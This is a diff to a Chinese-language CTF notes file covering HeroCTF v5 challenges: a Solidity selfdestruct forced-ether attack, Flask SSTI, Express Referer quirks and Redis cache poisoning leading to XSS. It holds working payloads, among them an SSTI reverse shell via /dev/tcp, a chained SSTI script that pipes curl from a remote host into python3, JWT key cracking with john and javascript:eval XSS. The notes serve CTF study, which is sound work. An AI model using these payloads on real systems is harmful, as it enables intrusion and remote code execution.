@@ -1758,7 +1758,7 @@ web3.eth.getCode(contractAddress, (error, bytecode) => {
 - 调用指定地址的contract的函数。
   - `cast send <addr> <func,exa:0x3c5269d8> --rpc-url $RPC_URL --private-key $PRIVATE_KEY --legacy`.private_key可以通过在另一个窗口运行anvil获取，不过我运行的时候提示gas超了，把gas改高了又有新问题。
   - 使用solidity。我尝试用remix运行，不过因为remix默认的环境跟题目不在一个chain上，给的rpc url也设置不了，就不了了之了。
-```js
+```solidity
 contract hero2300_pwn
 {
     function exploit(address addr) public 
@@ -1769,7 +1769,7 @@ contract hero2300_pwn
 ```
 - 用python web3和blockchain交互的[课程](https://www.youtube.com/watch?v=UBK2BoFv6Lo&list=PLCwnLq3tOElrubfUWHa1qKrJv1apO8Aag)
 210. [Classic one tbh](https://github.com/m4k2/HeroCTF-V5-WU-Foundry/tree/main#challenge-01--classic-one-tbh)
-- [selfdestruct](https://solidity-by-example.org/hacks/self-destruct/)漏洞。特征点：合约判断balance的逻辑依赖于`address(this).balance`。该函数会将一个合约从blockchain上删除，并将合约内剩余的全部ether转账到制定地址。
+- [selfdestruct](https://solidity-by-example.org/hacks/self-destruct/)漏洞。特征点：合约判断balance的逻辑依赖于`address(this).balance`。该函数会将一个合约从blockchain上删除，并将合约内剩余的全部ether转账到制定地址。可用于给没有实现接收转账功能的合约强行转账。
 ```
 The selfdestruct function in Solidity is used to delete a contract from the blockchain and transfer any remaining ether stored in the contract to a specified address.
 
@@ -1782,7 +1782,7 @@ There are three ways to transfer ether in Solidity: transfer, send, and call.val
 To prevent vulnerabilities caused by the selfdestruct function, developers can use a local state variable to update the current balance of the contract when the user deposits funds, instead of using address(this).balance.
 ```
 攻击合约例子：
-```js
+```solidity
 pragma solidity 0.8.17;
 
 contract Selfdestruct{
@@ -1800,10 +1800,78 @@ foundry释放/调用相关命令：
 forge create selfdestruct.sol:Selfdestruct --value 0.5ether --rpc-url $RPC_URL --private-key $PRIVATE_KEY
 cast send 0x[Selfdestruct] "kill(address)" 0x[target address] --rpc-url $RPC_URL --private-key $PRIVATE_KEY
 ```
+攻击原理：攻击合约实现了selfdestruct，kill函数的addr填题目的address。这样执行攻击合约的kill函数就会把攻击合约全部的ether转给题目合约。由于题目合约依赖`address(this).balance`计算自身balance，但又有局部变量计算应该有的balance：
+```solidity
+    function sell(uint256 _amount) external {
+        require(userBalances[msg.sender] >= _amount, "Insufficient balance");
+
+        userBalances[msg.sender] -= _amount;
+        totalSupply -= _amount;
+
+        (bool success, ) = msg.sender.call{value: _amount * TOKEN_PRICE}("");
+        require(success, "Failed to send Ether");
+        //getEtherBalance()内部使用address(this).balance
+        assert(getEtherBalance() == totalSupply * TOKEN_PRICE);
+    }
+```
+那么assert永远不会通过。
 211. [Drink from my Flask #1](https://github.com/HeroCTF/HeroCTF_v5/tree/main/Web/Drink_from_my_Flask_1)
 - python flask ssti+key爆破、session伪造
     - 反弹shell payload：`{{ cycler.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/172.17.0.1/9999 0>&1\"').read() }}`,172.17.0.1换为攻击机器外网ip
     - john爆破session key：`john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256`
+    - 此题的一些unintended solutions：
+```
+/{{config.update(u=config.update)}}
+/{{config.u(g="__globals__)}}
+/{{config.u(l=lipsum[config.g])}}
+/{{config.u(o=config.l['os'])}}
+/{{config.u(p=o.popen)}}
+/{{config.u(r=request.args)}}?b=cat+app.py&c=cat+flag.txt
+/{{config.p(config.r.b).read()}}
+/{{config.p(config.r.c).read()}}
+``` 
+```py
+import requests
+req = requests.session()
+payload = [
+    "/{{config.update(a=config.update)}}",
+    "/{{config.a(b=\"__globals__\")}}",
+    "/{{config.a(c=lipsum[config.b])}}",
+    "/{{config.a(d=config.c.os)}}",
+    "/{{config.a(e=config.d.popen)}}",
+    "/{{config.a(g='curl server')}}",
+    "/{{config.a(h='ipaddr:8080')}}",
+    "/{{config.a(i='/a|python3')}}",
+    "/{{config.a(j=config.g+config.h)}}",
+    "/{{config.a(k=config.j+config.i)}}",
+    "/{{config.a(k=config.j+config.i)}}"
+]
+for x in payload:
+    req.get(f"http://xxx.com{x}")
+print(req.get("http://xxx.com/{{config.e(config.k).read()}}").text)
+```
 212. [Referrrrer](https://mxcezl.github.io/posts/write-up/ctf/heroctf-v5/web/referrrrer/)
 - express 4.x中，`req.header("Referer")`表示取请求中的Referer字段的值，不过请求传`Referrer`同样可以取到值，两者在源码层面是一样的。而nginx.conf里就不能混用（nginx.conf里看的是`$http_referer`)。
 - 根据文档：`CaseSensitive: Disabled by default`,express 4.x里的路径名大小写不敏感。访问`/a`和`/A`是一样的。而nginx里location的配置是大小写敏感的
+213. DEX相关概念（[uniswap](https://docs.uniswap.org/contracts/v2/concepts/core-concepts/pools)，[liquidity pool](https://www.youtube.com/watch?v=dVJzcFDo498&list=PLHx4UicbtUoYvCvRouZ4XbaDpE7cbCCqo)）以及题目：
+- [blockchain2-4](https://github.com/Kaiziron/heroctf-v5/tree/main).另外这个系列有统一的非预期解：https://github.com/J4X-98/Writeups/blob/main/CTFs/HeroCTF/Chal2_3_4/writeup.md
+214. [Blogodogo](https://mxcezl.github.io/posts/write-up/ctf/heroctf-v5/web/blogodogo-2/)
+- 对于可以提交任意url的地方，可以使用`javascript:code`来执行任意js代码，不一定要带有payload的http url。如果代码太长，就将代码写为一行，然后base64编码执行。`javascript:eval(atob(base64))`
+- python flask里的`SESSION_COOKIE_HTTPONLY = True`配置项表示cookie无法被js代码获取。
+- redis缓存（caching）的错误使用。
+```py
+def profile():
+    key_name_url = "profile_" + current_user.username.lower() + "_url"
+    key_name_username = "profile_" + current_user.username.lower() + "_username" 
+    cache_url, cache_username = redis_client.get(key_name_url), redis_client.get(key_name_username)
+    if not cache_url or not cache_username:
+        redis_client.set(key_name_username, current_user.username)
+        redis_client.expire(key_name_username, 60)
+        redis_client.set(key_name_url, current_user.url)
+        redis_client.expire(key_name_url, 60)
+    cache_url, cache_username = redis_client.get(key_name_url).decode(), redis_client.get(key_name_username).decode()
+    return render_template("pages/profile.html", title="My profile", form=form,
+        cache_url=cache_url, cache_username=cache_username)
+```
+
+该段代码检查访问时是否已有缓存，如果有就直接返回缓存。但`current_user.username.lower()`将任意username全部转为小写。如果注册时不要求统一小写，缓存时却要求，可能导致缓存被投毒。攻击者可注册诸如`ADMIN`的账户，在缓存里存入恶意payload。由于大小写不敏感，真正的admin用户访问自己的缓存时也会出现恶意payload，有xss的风险。
